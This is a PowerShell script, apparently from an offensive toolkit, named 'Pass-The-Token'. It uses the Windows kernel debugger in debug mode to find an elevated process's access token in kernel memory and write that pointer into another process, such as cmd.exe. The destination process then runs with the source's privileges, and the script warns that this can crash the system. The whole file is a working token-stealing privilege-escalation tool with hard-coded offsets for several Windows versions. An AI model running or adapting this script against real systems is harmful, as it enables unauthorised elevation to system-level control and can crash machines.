<#

.SYNOPSIS 
PowerProcess utility to copy rights of a token process to another one
 
.DESCRIPTION 
This utility try to copy the reference token from a process to another one.

This utility copy the reference, so it has to be used carefully to avoid
create BSOD (double pointer deference REFERENCE_BY_POINTER)

This utility must be run with elevated permissions. 
We need the /debug mode switch to on (bcdedit.exe /debug on)

.EXAMPLE 
PS > Pass-The-Token -Source elevatedService.exe -Destination cmd.exe

Windows 7, 8, 10 supported (64 bits)

#>


[CmdletBinding()]
param (
    [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true, Position=0)]        
        [string] $Source,
    [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true, Position=1)]        
        [string] $Destination
)

#---------------------------------------------------------[Initialisations]--------------------------------------------------------

Set-StrictMode -version 2

$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition
$scriptParentPath = split-path -parent $scriptPath
$scriptFile = $MyInvocation.MyCommand.Definition
$launchDate = get-date -f "yyyyMMddHHmmss"
$logDirectoryPath = $scriptParentPath + "\" + $launchDate
$file = "$logDirectoryPath\lsass.dmp"
$buffer = "$scriptPath\bufferCommand.txt"
$fullScriptPath = (Resolve-Path -Path $buffer).Path

#----------------------------------------------------------[Declarations]----------------------------------------------------------

$kd = "$scriptPath\x64\kd.exe"
$symbols = "srv*c:\symbols*http://msdl.microsoft.com/download/symbols"
$utilityFunctions = "$scriptPath\Get-Utilities.ps1"

#----------------------------------------------------------[Functions]-------------------------------------------------------------

. $utilityFunctions

#----------------------------------------------------------[Execution]-------------------------------------------------------------

$operatingSystem = (Get-WmiObject Win32_OperatingSystem).version
$osArchitecture =  (Get-WmiObject Win32_OperatingSystem).OSArchitecture

$mode = Get-OperatingSystemMode $operatingSystem $osArchitecture

Switch ($mode) {
    "1" { 
            $offset = "208"
            $sidHashOffset = "+0x0e0+0x010"
            $activeProcessLinksOffset = ""
        }
    "132" { 
            $offset = "f8"
            $sidHashOffset = "+0x0e0+0x010"
            $activeProcessLinksOffset = ""
        }
    "2" { 
            $offset = "348"
            $sidHashOffset = "+0x0e8+0x010"
            $activeProcessLinksOffset = "0x2e8"
        }
    "8.1" {# to do
        }
    "2r2" {# to do
        }
    "232" {# to do
        }
    "2016" { 
            $offset = "358"
            $sidHashOffset = "+0x0e8+0x010"
            #   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
            $activeProcessLinksOffset = "0x2f0"
        }
    "1014342" {
            $offset = "358"
            $sidHashOffset = "+0x0e8+0x010"
            #   +0x2f0 ActiveProcessLinks : _LIST_ENTRY
            $activeProcessLinksOffset = "0x2f0"
    }
}

$chain = "!process 0 0 $Source"
Write-InFile $buffer "$chain"
$tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabSystem -split ' ')                   
$fi = [array]::indexof($tabFA,"PROCESS") + 1
$processAddress = $tabFA[$fi]
Write-Output "$Source memory address: $processAddress"

$chain =  "dq $processAddress+$offset L1"
Write-InFile $buffer "$chain"
$tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabOffset -split ' ')                
$fi = [array]::indexof($tabFA,"L1") + 3
$systemTokenAddress = $tabFA[$fi] -replace "``", ""
Write-Output "$Source token address: $systemTokenAddress"

$chain = "? $systemTokenAddress & fffffffffffffff0"
Write-InFile $buffer "$chain"
$tabAnd = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabAnd -split ' ') 
$fi = [array]::indexof($tabFA,"fffffffffffffff0") + 5
$systemTokenAddressAnded = $tabFA[$fi] -replace "``", ""
Write-Output "$Source token address anded: $systemTokenAddressAnded"

$chain = "!process 0 0 $Destination"
Write-InFile $buffer "$chain"
$tabCmd = Call-MemoryWalker $kd $file $fullScriptPath $symbols
$tabFA = ($tabCmd -split ' ')                   
$fi = [array]::indexof($tabFA,"PROCESS") + 1
$cmdAddress = $tabFA[$fi]
Write-Output "$Destination memory address: $cmdAddress"

$chain = "eq $cmdAddress+$offset $systemTokenAddressAnded"
Write-InFile $buffer "$chain"
$res = Call-MemoryWalker $kd $file $fullScriptPath $symbols

Write-Output "$Destination has $Source identity"